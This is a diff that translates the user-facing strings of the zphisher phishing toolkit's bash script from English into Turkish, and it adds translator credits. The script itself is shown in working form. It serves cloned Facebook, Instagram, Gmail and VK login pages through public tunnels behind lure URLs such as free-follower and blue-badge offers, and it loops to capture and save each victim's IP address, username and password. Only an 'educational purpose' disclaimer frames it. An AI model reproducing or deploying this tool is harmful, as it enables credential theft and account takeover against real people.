@@ -132,12 +132,12 @@ fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Kesintiye Uğradı." 2>&1; reset_color; }
 	exit 0
 }
 
 exit_on_signal_SIGTERM() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Sonlandırıldı." 2>&1; reset_color; }
 	exit 0
 }
 
@@ -163,7 +163,7 @@ kill_pid() {
 
 # Check for a newer release
 check_update(){
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Güncellemeyi kontrol etme: "
 	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
 	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
@@ -171,31 +171,31 @@ check_update(){
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
 		sleep 2
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Güncelleme indiriliyor..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
 		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
 
 		if [[ -e ".zphisher.tar.gz" ]]; then
 			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
-			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
+			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Ayıklanırken hata oluştu."; reset_color; exit 1; }
 			rm -f .zphisher.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Başarıyla güncellendi!  Zphisher’ı tekrar çalıştırınız.\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} İndirme sırasında hata oluştu."
 			{ reset_color; exit 1; }
 		fi
 	else
-		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+		echo -ne "${GREEN}güncel\n${WHITE}" ; sleep .5
 	fi
 }
 
 ## Check Internet Status
 check_status() {
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} İnternet Durumu: "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
@@ -213,7 +213,8 @@ banner() {
 		${ORANGE}      | |                                
 		${ORANGE}      |_|                ${RED}Version : ${__version__}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Htr-tech tarafından oluşturulan araç (tahmin.rayat)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} qEnderK tarafından çevirildi (Shoriu x qHerox Foundation)${WHITE}
 	EOF
 }
 
@@ -229,27 +230,27 @@ banner_small() {
 
 ## Dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Gerekli paketleri kuruluyor..."
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Paket yükleniyor: ${ORANGE}proot${CYAN}"${WHITE}
 			pkg install proot resolv-conf -y
 		fi
 
 		if [[ ! $(command -v tput) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Paket yükleniyor: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
 			pkg install ncurses-utils -y
 		fi
 	fi
 
 	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Paket zaten kuruldu."
 	else
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Paket kuruluyor: ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -263,7 +264,7 @@ dependencies() {
 				elif [[ $(command -v yum) ]]; then
 					sudo yum -y install "$pkg"
 				else
-					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Desteklenmeyen paket yöneticisi, Paketleri el ile yükleyin."
 					{ reset_color; exit 1; }
 				fi
 			}
@@ -295,7 +296,7 @@ download() {
 		chmod +x .server/$output > /dev/null 2>&1
 		rm -rf "$file"
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} İndirme sırasında hata oluştu ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -303,9 +304,9 @@ download() {
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared zaten indirildi."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Cloudflared kuruluyor..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -322,9 +323,9 @@ install_cloudflared() {
 ## Install LocalXpose
 install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose zaten kurulu."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} LocalXpose kuruluyor..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
@@ -341,7 +342,7 @@ install_localxpose() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Bu aracı kullandığınız için teşekkür ederiz.  İyi günler.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -349,34 +350,39 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${GREEN} Yapımcı   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
-		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
+		${GREEN} Sosyal   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Sürüm  ${RED}:  ${ORANGE}${__version__}
+		
+		${GREEN} Çevirici   ${RED}:  ${ORANGE}qEnderK ${RED}[ ${ORANGE} ${RED}]
+		${GREEN} GitHub   ${RED}:  ${CYAN}https://github.com/ShoriuOfficial
+		${GREEN} Sosyal   ${RED}:  ${CYAN}https://shoriuxqherox.com
+		${GREEN} Sürüm  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
-		${CYAN}  This Tool is made for educational purpose 
-		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
-		  any misuse of this toolkit ${RED}!${WHITE}
+		${CYAN}  Bu Araç sadece eğitim amaçlı yapılmıştır. 
+	     ${RED}!${WHITE}${CYAN} Yazar bu araç setinin 
+		  herhangi bir yanlış kullanımından sorumlu değildir. ${RED}!${WHITE}
 		
-		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
+		${WHITE} ${CYANBG}Özel teşekkürler:${RESETBG}
 		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
 		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
 		  Yisus7u7
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${RED}[${WHITE}00${RED}]${ORANGE} Ana menü     ${RED}[${WHITE}99${RED}]${ORANGE} Çıkış
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin: ${BLUE}"
 	case $REPLY in 
 		99)
 			msg_exit;;
 		0 | 00)
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Ana menüye dönüyor..."
 			{ sleep 1; main_menu; };;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; about; };;
 	esac
 }
@@ -384,28 +390,28 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Özel Bir Bağlantı Noktası ister misiniz ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Özel 4 haneli Portunuzu [1024-9999] girin.: ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
 			echo
 		else
-			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Geçersiz 4 basamaklı Bağlantı Noktası: $CU_P, yeniden deneyin...${WHITE}"
 			{ sleep 2; clear; banner_small; cusport; }
 		fi		
 	else 
-		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Varsayılan Bağlantı Noktası kullanılıyor $PORT...${WHITE}\n"
 	fi
 }
 
 ## Setup website and start php server
 setup_site() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Sunucu kurulumu..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} PHP sunucusu başlatılıyor..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
@@ -413,35 +419,35 @@ setup_site() {
 capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Kurbanın IP adresi: ${BLUE}$IP"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Şuraya kaydedildi: ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
 ## Get credentials
 capture_creds() {
-	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
-	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	ACCOUNT=$(grep -o 'K.adı:.*' .server/www/usernames.txt | awk '{print $2}')
+	PASSWORD=$(grep -o 'Şifre:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hesap: ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Şifre: ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Kaydedildi: ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Bir sonraki giriş bilgileri bekleniyor, ${BLUE}çıkmak için, ${ORANGE}Ctrl + C. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Bir sonraki giriş bilgileri bekleniyor, ${BLUE}çıkmak için, ${ORANGE}Ctrl + C."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Kurbanın IP adresi bulundu!"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Giriş bilgisi bulundu!!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
@@ -453,9 +459,9 @@ capture_data() {
 start_cloudflared() { 
 	rm .cld.log > /dev/null 2>&1 &
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Başlatılıyor... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Cloudflared başlatılıyor..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
@@ -475,11 +481,11 @@ localxpose_auth() {
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} ${ORANGE} üzerinde bir hesap oluşturun localxpose.io ${GREEN} & tokeni kopyala\n"
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Loclx tokenini girin:${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Localxpose tokenini girmeniz gerekiyor." ; sleep 2 ; tunnel_menu
 		} || {
 			echo -n "$loclx_token" > $auth_f 2> /dev/null
 		}
@@ -489,12 +495,12 @@ localxpose_auth() {
 ## Start LocalXpose (Again...)
 start_loclx() {
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Başlatılıyor... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Loclx Sunucu Bölgesini Değiştirmek İster misiniz? ${GREEN}[${CYAN}e${GREEN}/${CYAN}H${GREEN}]:${ORANGE} " opinion
+	[[ ${opinion,,} == "e" ]] && loclx_region="eu" || loclx_region="us"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} LocalXpose Başlatılıyor..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
@@ -508,28 +514,27 @@ start_loclx() {
 	capture_data
 }
 
-## Start localhost
+
 start_localhost() {
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Başlatılıyor... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Başarıyla Barındırıldı : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
-## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
-		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Otomatik Algılar${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}YENİ! Maks 15 Dakika${RED}]
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir port yönlendirme servisi seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -539,27 +544,29 @@ tunnel_menu() {
 		3 | 03)
 			start_loclx;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
 
+
 ## Custom Mask URL
 custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Mask URL'sini değiştirmek ister misiniz? ${GREEN}[${CYAN}e${GREEN}/${CYAN}H${GREEN}] :${ORANGE} " mask_op
 	echo
-	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+	if [[ ${mask_op,,} == "e" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Özel URL'nizi aşağıya girin ${CYAN}(${ORANGE}Örnek: https://get-free-followers.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # Bash 4+ gerektirir
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Özel Maskeli URL kullanılıyor :${GREEN} $mask"
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Geçersiz URL türü.. Varsayılan URL kullanılıyor.."
 		fi
 	fi
 }
+
 
 ## URL Shortner
 site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
@@ -595,27 +602,28 @@ custom_url() {
 		processed_url="https://$processed_url"
 	else
 		# echo "[!] No url provided / Regex Not Matched"
-		url="Unable to generate links. Try after turning on hotspot"
-		processed_url="Unable to Short URL"
+		url="Link oluşturulamadı. Hotspot açtıktan sonra tekrar deneyin"
+		processed_url="Kısaltılmış URL oluşturulamadı"
 	fi
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+	[[ $processed_url != *"Kısaltılmış"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
+
 
 ## Facebook
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Geleneksel Giriş Sayfası
+		${RED}[${WHITE}02${RED}]${ORANGE} Gelişmiş Oylama Anketi Giriş Sayfası
+		${RED}[${WHITE}03${RED}]${ORANGE} Sahte Güvenlik Giriş Sayfası
+		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Giriş Sayfası
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -635,7 +643,7 @@ site_facebook() {
 			mask='https://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
@@ -644,14 +652,14 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Geleneksel Giriş Sayfası
+		${RED}[${WHITE}02${RED}]${ORANGE} Otomatik Takipçi Giriş Sayfası
+		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Takipçi Giriş Sayfası
+		${RED}[${WHITE}04${RED}]${ORANGE} Mavi Rozet Doğrulama Giriş Sayfası
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -671,22 +679,23 @@ site_instagram() {
 			mask='https://blue-badge-verify-for-instagram-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
+
 
 ## Gmail/Google
 site_gmail() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Eski Giriş Sayfası
+		${RED}[${WHITE}02${RED}]${ORANGE} Gmail Yeni Giriş Sayfası
+		${RED}[${WHITE}03${RED}]${ORANGE} Gelişmiş Oylama Anketi
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -702,7 +711,7 @@ site_gmail() {
 			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
@@ -711,12 +720,12 @@ site_gmail() {
 site_vk() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Geleneksel Giriş Sayfası
+		${RED}[${WHITE}02${RED}]${ORANGE} Gelişmiş Oylama Anketi Giriş Sayfası
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -728,16 +737,16 @@ site_vk() {
 			mask='https://vote-for-the-best-social-media'
